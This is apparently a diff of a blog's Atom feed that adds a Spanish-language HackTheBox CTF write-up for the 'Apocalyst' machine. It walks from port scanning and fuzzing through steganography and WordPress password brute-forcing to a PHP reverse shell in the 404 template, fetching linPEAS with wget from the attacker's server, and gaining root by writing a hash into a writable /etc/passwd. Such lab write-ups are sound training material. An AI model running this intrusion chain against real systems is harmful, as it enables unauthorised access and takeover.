@@ -1,4 +1,256 @@
-<?xml version="1.0" encoding="utf-8"?><?xml-stylesheet type="text/xml" href="https://th4nuno.github.io/feed.xslt.xml"?><feed xmlns="http://www.w3.org/2005/Atom"><generator uri="http://jekyllrb.com" version="3.2.1">Jekyll</generator><link href="https://th4nuno.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://th4nuno.github.io/" rel="alternate" type="text/html" /><updated>2022-02-08T16:03:11-03:00</updated><id>https://th4nuno.github.io/</id><title type="html">Th4Nuno</title><subtitle>Moon is a minimal, one column jekyll theme for your blog.</subtitle><entry><title type="html">Aprende a Usar Wfuzz</title><link href="https://th4nuno.github.io/Aprende-a-Usar-Wfuzz/" rel="alternate" type="text/html" title="Aprende a Usar Wfuzz" /><published>2022-02-06T00:00:00-03:00</published><updated>2022-02-06T00:00:00-03:00</updated><id>https://th4nuno.github.io/Aprende-a-Usar-Wfuzz</id><content type="html" xml:base="https://th4nuno.github.io/Aprende-a-Usar-Wfuzz/">&lt;h1 id=&quot;qué-es-wfuzz&quot;&gt;¿Qué es Wfuzz?&lt;/h1&gt;
+<?xml version="1.0" encoding="utf-8"?><?xml-stylesheet type="text/xml" href="https://th4nuno.github.io/feed.xslt.xml"?><feed xmlns="http://www.w3.org/2005/Atom"><generator uri="http://jekyllrb.com" version="3.2.1">Jekyll</generator><link href="https://th4nuno.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://th4nuno.github.io/" rel="alternate" type="text/html" /><updated>2022-02-24T11:39:16-03:00</updated><id>https://th4nuno.github.io/</id><title type="html">Th4Nuno</title><subtitle>Moon is a minimal, one column jekyll theme for your blog.</subtitle><entry><title type="html">Apocalyst Writeup HackTheBox</title><link href="https://th4nuno.github.io/Apocalyst-Writeup-HackTheBox/" rel="alternate" type="text/html" title="Apocalyst Writeup HackTheBox" /><published>2022-02-22T00:00:00-03:00</published><updated>2022-02-22T00:00:00-03:00</updated><id>https://th4nuno.github.io/Apocalyst-Writeup-HackTheBox</id><content type="html" xml:base="https://th4nuno.github.io/Apocalyst-Writeup-HackTheBox/">&lt;h1 id=&quot;reconocimiento&quot;&gt;Reconocimiento&lt;/h1&gt;
+
+&lt;p&gt;Comenzamos con esta etapa usando una herramienta de escaneo de puertos muy conocida llamada &lt;em&gt;nmap&lt;/em&gt;. Primero haremos un escaneo simple para encontrar los puertos abiertos y luego buscaremos más detalle en los encontrados.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nmap -p- --open -v -T5 -sS -n -Pn 10.10.10.46 -oG allPorts&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Para realizar un escaneo del rango completo de puertos por TCP (0-65535) y mostrar solamente los abiertos usamos los parámetros &lt;em&gt;-p-&lt;/em&gt; y &lt;em&gt;–open&lt;/em&gt;. También agregamos &lt;em&gt;-v&lt;/em&gt; para irnos mostrando la información que nmap encuentre. Ahora, este escaneo puede llevar mucho tiempo. Para más rapidez, como estamos en un ambiente controlado en el que podemos hacer pruebas sin ningun tipo de problema, vamos a utilizar el nivel mas rápido que trae esta herramienta, especificando el parámetro &lt;em&gt;-T5&lt;/em&gt;, además de simplicar el escaneo con un SYN scan (&lt;em&gt;-sS&lt;/em&gt;), sin resolución DNS (&lt;em&gt;-n&lt;/em&gt;) y sin host discovery (&lt;em&gt;-Pn&lt;/em&gt;). Tambien lo voy a exportar en formato grepeable para obtener los puertos de una forma rápida con &lt;a href=&quot;https://pastebin.com/tYpwpauW&quot;&gt;extractPorts&lt;/a&gt;, una función en bash que tengo añadida a mi terminal.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;Host discovery disabled &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;-Pn&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;. All addresses will be marked &lt;span class=&quot;s1&quot;&gt;'up'&lt;/span&gt; and scan &lt;span class=&quot;nb&quot;&gt;times &lt;/span&gt;may be slower.
+Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-02-22 11:56 -03
+Initiating SYN Stealth Scan at 11:56
+Scanning 10.10.10.46 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65535 ports]
+Discovered open port 80/tcp on 10.10.10.46
+Discovered open port 22/tcp on 10.10.10.46
+SYN Stealth Scan Timing: About 37.29% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;; ETC: 11:57 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:00:52 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Completed SYN Stealth Scan at 11:57, 73.13s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65535 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.46
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.24s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.
+Not shown: 65533 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;reset&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Read data files from: /usr/bin/../share/nmap
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;73.24 seconds
+           Raw packets sent: 69344 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3.051MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 69344 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.774MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Nmap nos muestra que los únicos puertos que están abiertos son el 22 (SSH) y el 80 (HTTP). Ahora vamos a tomar estos puertos y realizar un escaneo para intentar obtener sus versiones y enumerar los servicios con los scripts de nmap (&lt;em&gt;-sCV&lt;/em&gt;)&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nmap -sCV -p 22,80 10.10.10.46 -oN targeted&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-02-22 13:36 -03
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.46
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.15s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| ssh-hostkey: 
+|   2048 fd:ab:0f:c9:22:d5:f4:8f:7a:0a:29:11:b4:04:da:c9 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|   256 76:92:39:0a:57:bd:f0:03:26:78:c7:db:1a:66:a5:bc &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_  256 12:12:cf:f1:7f:be:43:1f:d5:e6:6d:90:84:25:c8:bd &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+80/tcp open  http    Apache httpd 2.4.18 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
+|_http-generator: WordPress 4.8
+|_http-title: Apocalypse Preparation Blog
+|_http-server-header: Apache/2.4.18 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;14.08 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h3 id=&quot;wordpress&quot;&gt;Wordpress&lt;/h3&gt;
+
+&lt;p&gt;Ahora que tenemos mas información, sabemos especificamente sus versiones y además, con el script de nmap &lt;em&gt;http-generator&lt;/em&gt; vemos que el sitio web tiene de CMS un Wordpress. Esto lo podemos confirmar con whatweb:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;whatweb 10.10.10.46&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;http://10.10.10.46 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)]&lt;/span&gt;, IP[10.10.10.46], JQuery[1.12.4], MetaGenerator[WordPress 4.8], PoweredBy[WordPress,WordPress,], Script[text/javascript], Title[Apocalypse Preparation Blog], UncommonHeaders[link], WordPress[4.8]&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Como es un Wordpress usando &lt;strong&gt;wpscan&lt;/strong&gt;, que es una herramienta que podés encontrar &lt;a href=&quot;https://github.com/wpscanteam/wpscan&quot;&gt;acá&lt;/a&gt;, podemos escanear el sitio web en busca de algun fallo del que nos podramos aprovechar. En este caso no es de utilidad, asi que seguimos buscando.&lt;/p&gt;
+
+&lt;p&gt;Si miramos la página web a través de la ip se ve bastante mal. Esto lo podemos solucionar agregando el dominio, colocando la siguiente línea en nuestro &lt;em&gt;/etc/hosts&lt;/em&gt;:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;10.10.10.46 apocalyst.htb&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Utilizando el script &lt;em&gt;http-enum&lt;/em&gt; de nmap podemos hacer fuzzing con un diccionario muy simple que trae la misma, el cual nos arroja algunos resultados:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nmap --script&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;http-enum -p 80 10.10.10.46 -oN webScan&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.46
+  Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.15s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.
+  
+  PORT   STATE SERVICE
+  80/tcp open  http
+  | http-enum:
+  |   /blog/: Blog
+  |   /wp-login.php: Possible admin folder
+  |   /readme.html: Wordpress version: 2
+  |   /: WordPress version: 4.8
+  |   /wp-includes/images/rss.png: Wordpress version 2.2 found.
+  |   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
+  |   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
+  |   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
+  |   /wp-login.php: Wordpress login page.
+  |   /wp-admin/upgrade.php: Wordpress login page.
+  |   /readme.html: Interesting, a readme.
+  |   /custom/: Potentially interesting folder
+  |   /down/: Potentially interesting folder
+  |   /good/: Potentially interesting folder
+  |   /hidden/: Potentially interesting folder
+  |   /idea/: Potentially interesting folder
+  |   /info/: Potentially interesting folder
+  |   /information/: Potentially interesting folder
+  |   /name/: Potentially interesting folder
+  |   /page/: Potentially interesting folder
+  |   /personal/: Potentially interesting folder
+  |   /pictures/: Potentially interesting folder
+  |   /site/: Potentially interesting folder
+  |  /state/: Potentially interesting folder
+  
+  &lt;span class=&quot;c&quot;&gt;# Nmap done at Wed Feb 23 09:19:46 2022 -- 1 IP address (1 host up) scanned in 15.31 seconds&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Sin contar las páginas de Wordpress por defecto, la mayoría nos resuelven el mismo resultado: una simple imagen.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://th4nuno.github.io/assets/img/posts/apocalyst/apocalyst1.png&quot; alt=&quot;apocalyst1&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Esto ya parece un poco raro, vamos a seguir viendo a ver que encontramos.&lt;/p&gt;
+
+&lt;h3 id=&quot;fuzzing&quot;&gt;Fuzzing&lt;/h3&gt;
+
+&lt;p&gt;Haciendo fuzzing con la herramienta WFuzz (si no la conocés tengo un articulo &lt;a href=&quot;https://th4nuno.github.io/Aprende-a-Usar-Wfuzz&quot;&gt;acá&lt;/a&gt; en el que te enseño cómo utilizarla) encontramos el mismo resultado reiteradas veces, la misma imagen con la misma cantidad de carácteres, lo que significa que son idénticas. Como la página web es un blog con varios artículos, vamos a hacer uso de Cewl (que viene instalada por defecto en Parrot y Kali Linux), la cuál nos permitirá crear nuestro propio diccionario en base a la url que especifiquemos:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;cewl -w wordlist.txt &lt;span class=&quot;s2&quot;&gt;&quot;http://apocalyst.htb/&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Con este comando ya habríamos creado el archivo &lt;em&gt;wordlist.txt&lt;/em&gt; así que vamos a incorporarlo a WFuzz, ocultando los resultados que nos arrojen 157 carácteres que devuelven la imagen repetida:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;wfuzz -c --hc&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;404 --hh&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;157 -t 200 -L -u &lt;span class=&quot;s2&quot;&gt;&quot;http://apocalyst.htb/FUZZ&quot;&lt;/span&gt; -w ../content/wordlist.txt&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;k&quot;&gt;********************************************************&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Wfuzz 3.1.0 - The Web Fuzzer                         &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;********************************************************&lt;/span&gt;
+
+Target: http://apocalyst.htb/FUZZ
+Total requests: 532
+
+&lt;span class=&quot;o&quot;&gt;=====================================================================&lt;/span&gt;
+ID           Response   Lines    Word       Chars       Payload                                                                                                                     
+&lt;span class=&quot;o&quot;&gt;=====================================================================&lt;/span&gt;
+
+000000455:   200        14 L     20 W       175 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;Rightiousness&quot;&lt;/span&gt;                                                                                                             
+
+Total &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;: 0
+Processed Requests: 532
+Filtered Requests: 531
+Requests/sec.: 0&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Como ven encontramos solo una página, pero lo que más nos llama la atención es que nos muestra la misma imagen que vimos anteriormente, pero con una cantidad de carácteres diferente. Esto significa que seguramente estamos ante una técnica de &lt;strong&gt;esteganografía&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;esteganografía-en-imágenes&quot;&gt;Esteganografía en Imágenes&lt;/h2&gt;
+
+&lt;p&gt;Esta técnica de criptografía muy conocida nos permite ocultar información dentro de una imagen, pero sin que se vea a simple vista. Esto es lo que nos está pasando seguramente. Todas las imágenes son iguales menos una, que tiene un tamaño diferente (por eso nos devuelve otra cantidad diferente de carácteres). Para analizarla y comprobar si hay un archivo oculto dentro, vamos a utilizar un herramienta llamada &lt;strong&gt;steghide&lt;/strong&gt;. Descargamos la imagen y utilizamos el siguiente comando.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;steghide info image.jpg&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;s2&quot;&gt;&quot;image.jpg&quot;&lt;/span&gt;:
+  format: jpeg
+  capacity: 13.0 KB
+Try to get information about embedded data ? &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;y/n&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; y
+Enter passphrase: 
+  embedded file &lt;span class=&quot;s2&quot;&gt;&quot;list.txt&quot;&lt;/span&gt;:
+    size: 3.6 KB
+    encrypted: rijndael-128, cbc
+    compressed: yes&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Al ejecutarlo nos pide una contraseña, pero si probamos dejándolo en blanco funciona. Nos muestra que hay un archivo list.txt contenido dentro de la imagen, el cual podemos extraer:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;steghide extract -sf image.jpg&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;El archivo que obtenemos no es más que una simple lista de palabras, pero que podemos utilizar para intentar hacer un bruteforcing.&lt;/p&gt;
+
+&lt;h3 id=&quot;bruteforcing&quot;&gt;Bruteforcing&lt;/h3&gt;
+
+&lt;p&gt;Para esto tenemos que obtener un usuario válido. Esto es muy fácil, ya que si observamos cualquier artículo del sitio web como es un Wordpress nos muestra el usuario que lo creó. Este usuario se llama “falaraki”. Podemos comprobar que es un usuario válido visitando &lt;em&gt;wp-login.php&lt;/em&gt;, colocando un usuario erróneo obtenemos:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://th4nuno.github.io/assets/img/posts/apocalyst/apocalyst2.png&quot; alt=&quot;apocalyst2&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Claramente nos dice que lo que está mal es el usuario. Ahora, vamos a ver qué nos muestra si probamos con falaraki:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://th4nuno.github.io/assets/img/posts/apocalyst/apocalyst3.png&quot; alt=&quot;apocalyst3&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora nos dice otra cosa diferente. Esto es porque Wordpress por defecto diferencia el error de un usuario inválido al de un usuario válido con una contraseña incorrecta. Por lo tanto, vamos a probar de vuelta con &lt;strong&gt;wpscan&lt;/strong&gt; pero ahora realizando un bruteforcing. Para eso vamos a utilizar el siguiente comando, habiendo guardado el usuario dentro de un archivo “user” en el mismo directorio que nuestra lista de contraseñas:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;wpscan --url http://apocalyst.htb/ -U user -P list.txt&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Performing password attack on Wp Login against 1 user/s
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;SUCCESS] - falaraki / Transclisiation                                                                                                                                                       
+Trying falaraki / total Time: 00:00:21 &amp;lt;&lt;span class=&quot;o&quot;&gt;=============================================&lt;/span&gt;                                                                     &amp;gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;335 / 821&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 40.80%  ETA: ??:??:??
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;!] Valid Combinations Found:
+ | Username: falaraki, Password: Transclisiation&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Excelente! Conseguimos credenciales válidas, ahora toca la parte mas fácil, que es obtener acceso a la máquina.&lt;/p&gt;
+
+&lt;h3 id=&quot;explotando-el-panel-de-wordpress&quot;&gt;Explotando el Panel de Wordpress&lt;/h3&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://th4nuno.github.io/assets/img/posts/apocalyst/apocalyst4.png&quot; alt=&quot;apocalyst4&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora que estamos dentro del panel de Wordpress, vamos a dirigirnos a &lt;em&gt;Appeareance-&amp;gt;Editor&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://th4nuno.github.io/assets/img/posts/apocalyst/apocalyst5.png&quot; alt=&quot;apocalyst5&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Dentro del editor, vamos a abrir el template &lt;em&gt;404.php&lt;/em&gt; que se encuentra a la derecha. Esto nos permite modificar el código PHP del mismo, por lo tanto simplemente añadimos una reverse shell en PHP y guardamos el archivo. Solo falta ponernos en escucha con &lt;strong&gt;netcat&lt;/strong&gt; e irnos a un artículo que no exista. Para ponernos en escucha por el puerto 443 ejecutamos el siguiente comando:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nc -nvlp 443&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Como podemos listar los artículos con &lt;em&gt;?p=x&lt;/em&gt; vamos a cambiarlo a un número que no exista, como por ejemplo &lt;em&gt;?p=10&lt;/em&gt; y obtenemos inmediatamente la shell.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;www-data@apocalyst:/var/www/html/apocalyst.htb$ &lt;/span&gt;whoami
+whoami
+www-data&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h4 id=&quot;tratamiento-de-la-tty&quot;&gt;Tratamiento de la TTY&lt;/h4&gt;
+
+&lt;p&gt;La shell que tenemos realmente no es tan cómoda, así que para solucionarlo podemos realizar una serie de pasos que siempre son los mismos en una máquina Linux, para poder obtener una shell completamente funcional.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;script /dev/null -c bash
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ctrl-Z&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+stty raw -echo; &lt;span class=&quot;nb&quot;&gt;fg
+	&lt;/span&gt;reset xterm
+&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;TERM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;xterm
+&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;SHELL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;bash&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Listo. Ahora podemos hacer Ctrl-C sin peligro de que se nos cierre la bash y Ctrl-L para limpiar la terminal.&lt;/p&gt;
+
+&lt;p&gt;Si nos dirigimos a /home/falaraki encontramos el user.txt con la flag. Ahora toca escalar privilegios.&lt;/p&gt;
+
+&lt;h2 id=&quot;escalación-de-privilegios&quot;&gt;Escalación de Privilegios&lt;/h2&gt;
+
+&lt;p&gt;Vamos a descargar en la máquina &lt;a href=&quot;https://github.com/carlospolop/PEASS-ng&quot;&gt;&lt;strong&gt;linPEAS&lt;/strong&gt;&lt;/a&gt;, una utilidad que nos permitirá realizar una gran cantidad de escaneos para encontrar fallas en el sistema. Para traerla decidí crear en mi máquina un servidor en Python en el mismo directorio que tengo el script y descargar el archivo en la shell.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;En mi máquina&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+python3 -m http.server 80
+
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;En la máquina víctima&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /dev/shm
+wget http://10.10.14.7/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Como el escaneo devuelve demasiada información voy a colocar sólo un fragmento que me llamó mucho la atención:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;╔══════════╣ Permissions &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;init, init.d, systemd, and rc.d   
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#init-init-d-systemd-and-rc-d
+═╣ Writable passwd file? ................ /etc/passwd is writable&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Esto muy pocas veces lo van a ver, pero cuando lo vean ya tienen asegurado el root. Como tenemos permisos para escribir en el passwd podemos acceder como el usuario que queramos. Lo pueden comprobar haciendo un &lt;em&gt;ls&lt;/em&gt;:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;ls -la /etc/passwd
+-rw-rw-rw- 1 root root 1649 Feb 24 12:25 /etc/passwd&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Por defecto los usuarios tienen una x, lo que significa que la contraseña la tomará del /etc/shadow, archivo el cuál no tenemos acceso. Por lo tanto, necesitamos cambiar esa x por un hash, porque el sistema tomará la primera contraseña que encuentre, que será la añadida.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;&amp;gt; &lt;/span&gt;openssl passwd
+Password: toor
+Verifying - Password: toor
+2r5/v3qyIr5jI&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Cambiamos la x de root en el /etc/passwd por este hash y listo:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;www-data@apocalyst:/dev/shm$ &lt;/span&gt;su root
+Password: 
+&lt;span class=&quot;gp&quot;&gt;root@apocalyst:/dev/shm# &lt;/span&gt;whoami 
+root
+&lt;span class=&quot;gp&quot;&gt;root@apocalyst:/dev/shm# &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;</content><category term="fuzzing" /><category term="pentesting" /><category term="web" /><category term="cryptography" /><category term="privesc" /><summary type="html">Les traigo el writeup de una máquina de tipo CTF, la cuál tiene una intrusión bastante única y siendo de dificultad media es bastante accesible para los que están empezando en el mundo del pentesting</summary></entry><entry><title type="html">Aprende a Usar Wfuzz</title><link href="https://th4nuno.github.io/Aprende-a-Usar-Wfuzz/" rel="alternate" type="text/html" title="Aprende a Usar Wfuzz" /><published>2022-02-06T00:00:00-03:00</published><updated>2022-02-06T00:00:00-03:00</updated><id>https://th4nuno.github.io/Aprende-a-Usar-Wfuzz</id><content type="html" 